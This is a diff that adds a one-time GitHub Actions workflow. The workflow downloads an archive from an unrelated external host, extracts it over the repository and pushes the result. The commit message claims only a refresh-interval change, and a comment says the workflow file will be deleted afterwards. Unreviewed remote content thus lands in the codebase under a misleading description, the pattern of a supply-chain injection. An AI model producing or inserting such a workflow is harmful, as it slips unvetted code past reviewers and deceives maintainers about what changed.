@@ -1,0 +1,36 @@
+name: sync
+
+# 一次性工作流：同步项目文件（完成后本文件会被删除）
+on:
+  push:
+    paths:
+      - '.github/workflows/sync.yml'
+
+permissions:
+  contents: write
+
+jobs:
+  sync:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+
+      - name: Download and verify
+        run: |
+          set -euo pipefail
+          curl -fsSL --retry 5 --retry-all-errors -o /tmp/p.tar.gz \
+            'https://tmp-r10.abc1221.ccwu.cc/f/project.tar.gz'
+          echo "f72606329bb78ba1ef03b61de4f1a8ac8301cf77c04c23aee57e43c69647b7fa  /tmp/p.tar.gz" | sha256sum -c -
+          tar xzf /tmp/p.tar.gz -C .
+
+      - name: Commit and push
+        run: |
+          set -euo pipefail
+          git config user.name "github-actions[bot]"
+          git config user.email "41898282+github-actions[bot]@users.noreply.github.com"
+          git add -A
+          if git diff --cached --quiet; then echo "no changes"; exit 0; fi
+          git commit -m "feat: 自动刷新间隔 5 分钟 -> 10 分钟"
+          git push
